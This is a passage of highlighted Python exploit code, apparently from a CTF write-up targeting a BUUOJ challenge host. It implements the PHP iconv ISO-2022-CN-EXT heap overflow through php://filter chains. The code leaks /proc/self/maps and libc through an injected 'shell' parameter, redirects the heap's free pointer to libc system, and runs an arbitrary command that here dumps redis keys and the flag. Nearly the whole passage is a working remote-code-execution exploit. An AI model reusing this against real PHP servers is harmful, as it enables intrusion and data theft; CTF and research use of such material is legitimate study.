</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_symbols_and_addresses</span><span class=p>(</span><span class=n>regions</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># PHP&#39;s heap</span>
</span></span><span class=line><span class=cl>    <span class=n>heap</span> <span class=o>=</span> <span class=n>find_main_heap</span><span class=p>(</span><span class=n>regions</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Libc</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_info</span> <span class=o>=</span> <span class=n>_get_region</span><span class=p>(</span><span class=n>regions</span><span class=p>,</span> <span class=s2>&#34;libc-&#34;</span><span class=p>,</span> <span class=s2>&#34;libc.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>heap</span><span class=p>,</span> <span class=n>libc_info</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_exploit_path</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>heap</span><span class=p>,</span> <span class=n>sleep</span><span class=p>,</span> <span class=n>padding</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>LIBC</span> <span class=o>=</span> <span class=n>libc</span>
</span></span><span class=line><span class=cl>    <span class=n>ADDR_EMALLOC</span> <span class=o>=</span> <span class=n>LIBC</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__libc_malloc&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ADDR_EFREE</span> <span class=o>=</span> <span class=n>LIBC</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__libc_system&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ADDR_EREALLOC</span> <span class=o>=</span> <span class=n>LIBC</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__libc_realloc&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ADDR_HEAP</span> <span class=o>=</span> <span class=n>heap</span>
</span></span><span class=line><span class=cl>    <span class=n>ADDR_FREE_SLOT</span> <span class=o>=</span> <span class=n>ADDR_HEAP</span> <span class=o>+</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl>    <span class=n>ADDR_CUSTOM_HEAP</span> <span class=o>=</span> <span class=n>ADDR_HEAP</span> <span class=o>+</span> <span class=mh>0x0168</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ADDR_FAKE_BIN</span> <span class=o>=</span> <span class=n>ADDR_FREE_SLOT</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>CS</span> <span class=o>=</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Pad needs to stay at size 0x100 at every step</span>
</span></span><span class=line><span class=cl>    <span class=n>pad_size</span> <span class=o>=</span> <span class=n>CS</span> <span class=o>-</span> <span class=mh>0x18</span>
</span></span><span class=line><span class=cl>    <span class=n>pad</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=n>pad_size</span>
</span></span><span class=line><span class=cl>    <span class=n>pad</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>pad</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>pad</span><span class=p>)</span> <span class=o>+</span> <span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pad</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>pad</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>pad</span><span class=p>)</span> <span class=o>+</span> <span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pad</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>pad</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>pad</span><span class=p>)</span> <span class=o>+</span> <span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pad</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>pad</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step1_size</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>step1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=n>step1_size</span>
</span></span><span class=line><span class=cl>    <span class=n>step1</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step1</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step1</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step1</span><span class=p>,</span> <span class=n>CS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step1</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>step1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>
</span></span><span class=line><span class=cl>    <span class=c1># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &#34;crash&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step2_size</span> <span class=o>=</span> <span class=mh>0x48</span>
</span></span><span class=line><span class=cl>    <span class=n>step2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=n>step2_size</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step2</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step2</span><span class=p>,</span> <span class=n>CS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step2</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step2</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>step2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step2_write_ptr</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;0</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>step2_size</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ADDR_FAKE_BIN</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step2_write_ptr</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step2_write_ptr</span><span class=p>,</span> <span class=n>CS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step2_write_ptr</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step2_write_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step2_write_ptr</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>step2_write_ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step3_size</span> <span class=o>=</span> <span class=n>CS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step3</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=n>step3_size</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>step3</span><span class=p>)</span> <span class=o>==</span> <span class=n>CS</span>
</span></span><span class=line><span class=cl>    <span class=n>step3</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step3</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step3</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step3</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>step3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step3_overflow</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=n>step3_size</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>BUG</span><span class=p>))</span> <span class=o>+</span> <span class=n>BUG</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>step3_overflow</span><span class=p>)</span> <span class=o>==</span> <span class=n>CS</span>
</span></span><span class=line><span class=cl>    <span class=n>step3_overflow</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step3_overflow</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step3_overflow</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step3_overflow</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step3_overflow</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step3_overflow</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step3_overflow</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>step3_overflow</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step4_size</span> <span class=o>=</span> <span class=n>CS</span>
</span></span><span class=line><span class=cl>    <span class=n>step4</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;=00&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=n>step4_size</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>step4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># This chunk will eventually overwrite mm_heap-&gt;free_slot</span>
</span></span><span class=line><span class=cl>    <span class=c1># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>
</span></span><span class=line><span class=cl>    <span class=n>step4_pwn</span> <span class=o>=</span> <span class=n>ptr_bucket</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x200000</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=c1># free_slot</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>ADDR_CUSTOM_HEAP</span><span class=p>,</span>  <span class=c1># 0x18</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>ADDR_HEAP</span><span class=p>,</span>  <span class=c1># 0x140</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>size</span><span class=o>=</span><span class=n>CS</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step4_custom_heap</span> <span class=o>=</span> <span class=n>ptr_bucket</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>ADDR_EMALLOC</span><span class=p>,</span> <span class=n>ADDR_EFREE</span><span class=p>,</span> <span class=n>ADDR_EREALLOC</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step4_use_custom_heap_size</span> <span class=o>=</span> <span class=mh>0x140</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>COMMAND</span> <span class=o>=</span> <span class=n>cmd</span>
</span></span><span class=line><span class=cl>    <span class=n>COMMAND</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;kill -9 $PPID; </span><span class=si>{</span><span class=n>COMMAND</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sleep</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>COMMAND</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;sleep </span><span class=si>{</span><span class=n>sleep</span><span class=si>}</span><span class=s2>; </span><span class=si>{</span><span class=n>COMMAND</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>COMMAND</span> <span class=o>=</span> <span class=n>COMMAND</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=nb>len</span><span class=p>(</span><span class=n>COMMAND</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=n>step4_use_custom_heap_size</span>
</span></span><span class=line><span class=cl>    <span class=p>),</span> <span class=sa>f</span><span class=s2>&#34;Command too big (</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>COMMAND</span><span class=p>)</span><span class=si>}</span><span class=s2>), it must be strictly inferior to </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>step4_use_custom_heap_size</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>COMMAND</span> <span class=o>=</span> <span class=n>COMMAND</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>step4_use_custom_heap_size</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>step4_use_custom_heap</span> <span class=o>=</span> <span class=n>COMMAND</span>
</span></span><span class=line><span class=cl>    <span class=n>step4_use_custom_heap</span> <span class=o>=</span> <span class=n>qpe</span><span class=p>(</span><span class=n>step4_use_custom_heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4_use_custom_heap</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step4_use_custom_heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4_use_custom_heap</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step4_use_custom_heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4_use_custom_heap</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>step4_use_custom_heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>step4_use_custom_heap</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>step4_use_custom_heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pages</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>step4</span> <span class=o>*</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>step4_pwn</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>step4_custom_heap</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>step4_use_custom_heap</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>step3_overflow</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>pad</span> <span class=o>*</span> <span class=n>padding</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>step1</span> <span class=o>*</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>step2_write_ptr</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=n>step2</span> <span class=o>*</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>resource</span> <span class=o>=</span> <span class=n>compress</span><span class=p>(</span><span class=n>compress</span><span class=p>(</span><span class=n>pages</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>resource</span> <span class=o>=</span> <span class=n>b64</span><span class=p>(</span><span class=n>resource</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>resource</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;data:text/plain;base64,</span><span class=si>{</span><span class=n>resource</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>filters</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=c1># Create buckets</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;zlib.inflate&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;zlib.inflate&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Step 0: Setup heap</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;dechunk&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;convert.iconv.latin1.latin1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Step 1: Reverse FL order</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;dechunk&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;convert.iconv.latin1.latin1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Step 2: Put fake pointer and make FL order back to normal</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;dechunk&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;convert.iconv.latin1.latin1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Step 3: Trigger overflow</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;dechunk&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;convert.quoted-printable-decode&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;convert.iconv.latin1.latin1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>filters</span> <span class=o>=</span> <span class=s2>&#34;|&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>filters</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;php://filter/read=</span><span class=si>{</span><span class=n>filters</span><span class=si>}</span><span class=s2>/resource=</span><span class=si>{</span><span class=n>resource</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=n>path</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;+&#34;</span><span class=p>,</span> <span class=s2>&#34;%2b&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># -------------------------- ç®€åŒ–ç‰ˆä¸»å‡½æ•° --------------------------</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>ip</span> <span class=o>=</span> <span class=s2>&#34;cd75b1b6-18d7-4482-911c-43be6f8dbeab.node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;81&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;http://</span><span class=si>{</span><span class=n>ip</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>maps</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/proc/self/maps%27);foreach($context%20as%20$f)</span><span class=se>{{</span><span class=s2>echo($f);</span><span class=se>}}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;maps&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>maps</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>?shell=?%3E%3C?php%20$context%20=%20new%20SplFileObject(%27php://filter/convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so%27);foreach($context%20as%20$f)</span><span class=se>{{</span><span class=s2>echo($f);</span><span class=se>}}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;libc-2.23.so&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>regions</span> <span class=o>=</span> <span class=n>get_regions</span><span class=p>(</span><span class=s2>&#34;maps&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap</span><span class=p>,</span> <span class=n>libc_info</span> <span class=o>=</span> <span class=n>get_symbols_and_addresses</span><span class=p>(</span><span class=n>regions</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;libc-2.23.so&#34;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_info</span><span class=o>.</span><span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span> <span class=o>=</span> <span class=s2>&#34;(echo </span><span class=se>\&#34;</span><span class=s2>auth admin123</span><span class=se>\n</span><span class=s2>keys *</span><span class=se>\n</span><span class=s2>get flag</span><span class=se>\&#34;</span><span class=s2> | redis-cli) &gt; /tmp/1.txt&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>build_exploit_path</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>heap</span><span class=p>,</span> <span class=n>sleep</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>padding</span><span class=o>=</span><span class=mi>20</span><span class=p>,</span> <span class=n>cmd</span><span class=o>=</span><span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27</span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2>%27);foreach($context%20as%20$f)</span><span class=se>{{</span><span class=s2>echo($f);</span><span class=se>}}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27/tmp/1.txt%27);foreach($context%20as%20$f)</span><span class=se>{{</span><span class=s2>echo($f);</span><span class=se>}}</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
